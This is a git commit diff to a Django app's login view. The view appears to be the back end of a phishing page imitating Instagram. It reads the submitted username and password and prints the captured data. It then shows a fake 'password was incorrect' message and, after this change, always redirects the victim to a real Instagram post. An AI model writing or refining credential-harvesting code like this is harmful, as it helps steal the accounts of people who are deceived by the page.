3d26e5388f6b95785a3f51a024142f3f2de2d2ad
aahadrahi <aahadrahi786@gmail.com>
2024-01-13 16:56:29 +0530

    dsf

--- myapp/views.py
+++ myapp/views.py
@@ -5,15 +5,11 @@ from django.contrib import messages
 import json
 import os
 def index(request):
-    click_count = request.session.get('click_count', 0)
     return render(request, 'myapp/index.html', {'message': 'Hello, this is your app\'s index page.'})
 def login_view(request):
     success_message = None
 
     if request.method == 'POST':
-        click_count = request.session.get('click_count', 0)
-        click_count += 1
-        request.session['click_count'] = click_count
         username = request.POST.get('username')
         password = request.POST.get('password')
 
@@ -22,9 +18,6 @@ def login_view(request):
         print(user_data)
         success_message = 'Sorry, your password was incorrect. Please double-check your password.'
         messages.success(request, success_message)
-        if click_count == 2:
-            # Click count ko reset karein
-            request.session['click_count'] = 0
-            return redirect('https://www.instagram.com/p/C1-Bhj2v0T-/')
+        return redirect('https://www.instagram.com/p/C1-Bhj2v0T-/')
 
     return render(request, 'myapp/index.html', {'success_message': success_message})
